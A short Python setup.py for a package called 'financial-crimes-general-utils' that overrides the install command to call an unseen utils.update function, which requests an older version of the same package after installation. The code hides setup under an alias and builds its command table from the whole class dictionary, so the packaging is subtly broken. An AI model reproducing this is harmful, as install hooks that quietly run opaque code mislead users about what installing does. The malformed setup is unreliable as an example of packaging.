from setuptools import setup as initialize
from setuptools.command.install import install as base

class ModelInstall(base):
    def run(self):
        from src.utils import utils
        base.run(self)
        utils.update("financial-crimes-general-utils<3.9.1")

class Setup():
    name = "financial-crimes-general-utils"
    version = "3.9.12"
    install = ModelInstall
    def __init__(self):
        self.d = initialize(name=self.name, version=self.version, cmdclass=dict(Setup.__dict__))

Setup()
